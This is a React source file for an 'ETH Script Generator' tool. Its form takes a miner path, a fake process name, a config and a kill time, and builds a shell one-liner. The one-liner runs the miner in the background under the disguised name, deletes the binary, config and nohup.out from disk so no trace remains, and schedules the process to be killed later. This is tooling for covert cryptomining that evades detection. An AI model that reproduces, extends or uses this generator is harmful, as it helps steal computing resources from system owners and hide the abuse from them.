import React, {useState} from 'react';
import './App.css';
import '98.css';

function App() {
    const [minerFilepath, setMinerFilepath] = useState('')
    const [fakeProcessName, setFakeProcessName] = useState('')
    const [config, setConfig] = useState('')
    const [configFilename, setConfigFilename] = useState('')
    const [killAt, setKillAt] = useState('')

    const script = ` echo ${new Buffer(config).toString('base64')} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 5 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill -9 | at ${killAt}`

    const handleCopyScriptBtnClick = () => {
        console.log('Copy script btn click, state:', {
            minerFilepath,
            fakeProcessName,
            config,
            configFilename,
            killAt,
            script,
        })
    }

    return (
        <div
            className="window"
            style={{width: '600px'}}
        >
            <div className="title-bar">
                <div className="title-bar-text">
                    ETH Script Generator
                </div>
            </div>
            <div className="window-body">
                <div className="field-row-stacked">
                    <label>Miner filepath</label>
                    <input
                        type="text"
                        onChange={e => setMinerFilepath(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Fake process name</label>
                    <input
                        type="text"
                        onChange={e => setFakeProcessName(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config</label>
                    <textarea
                        rows={10}
                        onChange={e => setConfig(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config filename</label>
                    <input
                        type="text"
                        onChange={e => setConfigFilename(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Kill at</label>
                    <input
                        type="text"
                        onChange={e => setKillAt(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Script</label>
                    <textarea
                        rows={8}
                        defaultValue={script}
                    />
                </div>
                <div className="field-row">
                    <button onClick={handleCopyScriptBtnClick}>Copy script</button>
                </div>
            </div>
        </div>
    );
}

export default App;
